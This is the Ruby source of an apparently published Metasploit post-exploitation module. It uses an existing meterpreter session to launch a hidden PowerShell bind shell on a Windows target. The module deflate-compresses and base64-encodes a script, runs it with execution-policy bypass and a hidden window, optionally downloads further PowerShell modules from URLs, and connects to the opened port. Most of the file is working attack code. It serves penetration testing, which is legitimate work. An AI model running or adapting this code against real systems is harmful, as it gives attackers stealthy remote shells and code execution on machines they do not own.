##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Windows Local Interactive Powershell Session",
      'Description'          => %q(
        This module will start a new interactive PowerShell bind session. A list of
        modules (comma separated) can be supplied in the LOAD_MODULES option to import
        into the interactive session. E.g. http://site/p1.ps1,http://site/p2.ps1
        Use a meterpreter route to ensure you can gain access to the bind port.
      ),
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'DisclosureDate'       => 'Apr 15 2015',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'Payload'        =>
        {
          'Compat' =>
          {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find'
          }
        },
      'Arch'          => [ ARCH_CMD ],
      'Targets'       =>
        [
          [ 'Windows', {} ]
        ],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::LPORT(4444),
        OptAddress.new('RHOST', [false, 'The target address, will default to the session IP if unset', nil]),
        OptString.new('LOAD_MODULES', [false,
                                       'A list of powershell modules seperated by a comma to download over the web',
                                       nil])
      ], self.class)
  end

  #
  # compression function for powershell
  #
  def compress_script(script_in, eof = nil)

    # Compress using the Deflate algorithm
    compressed_stream = ::Zlib::Deflate.deflate(script_in,
      ::Zlib::BEST_COMPRESSION)

    # Base64 encode the compressed file contents
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$stream = New-Object IO.MemoryStream(,"
    psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
    # Read & delete the first two bytes due to incompatibility with MS
    psh_expression += "$stream.ReadByte()|Out-Null;"
    psh_expression += "$stream.ReadByte()|Out-Null;"
    # Uncompress and invoke the expression (execute)
    psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
    psh_expression += "$(New-Object IO.Compression.DeflateStream("
    psh_expression += "$stream,"
    psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
    psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

    return psh_expression
  end

  def exploit
    lport = datastore['LPORT']

    if datastore['RHOST'].to_s.empty?
      rhost = session.session_host
    else
      rhost = datastore['RHOST']
    end

    template_path = File.join(
      Msf::Config.data_directory,
      'exploits',
      'powershell',
      'powerfun.ps1')

    script_in = File.read(template_path)
    script_in << "\npowerfun -Command bind"

    mods = ''

    if datastore['LOAD_MODULES']
      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
      mods_array.collect(&:strip)
      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
      mods_array.each {|m| vprint_good " #{m}"}
      mods = "\"#{mods_array.join("\",\n\"")}\""
      script_in << "  -Download true\n"
    end

    script_in.gsub!('MODULES_REPLACE', mods)
    script_in.gsub!('LPORT_REPLACE', lport.to_s)

    script = compress_script(script_in)

    res = session.sys.process.execute("powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})", nil, 'Hidden' => true, 'Channelized' => false)
    fail_with(Failure::Unknown,'Failed to start powershell process') unless res && res.pid
    computer_name = session.sys.config.sysinfo['Computer']
    vprint_status("Started PowerShell on #{computer_name} - PID: #{res.pid}")
    print_status("Attemping to connect to #{rhost}:#{lport}...")

    ctimeout = 30
    stime = Time.now.to_i
    last_error = nil
    while stime + ctimeout > Time.now.to_i
      Rex::ThreadSafe.sleep(2)
      begin
        client = Rex::Socket::Tcp.create(
          'PeerHost' => rhost,
          'PeerPort' => lport.to_i,
          'Proxies'  => datastore['Proxies'],
          'Context'  =>
            {
              'Msf'        => framework,
              'MsfPayload' => payload_instance,
              'MsfExploit' => self
            })
      rescue ::EOFError, Errno::ETIMEDOUT, Errno::ECONNRESET, Rex::ConnectionError, Rex::ConnectionTimeout, ::Timeout::Error => e
        last_error = e
      end

      if client
        handler(client)
        return
      end
    end

    print_warning("If a shell is unsuccesful, ensure you have access to the target host and port.")
    print_status("Try adding a route to the host: `route help`")
    if last_error
      raise last_error
    else
      fail_with(Failure::Unknown, "Unable to connect")
    end
  end
end
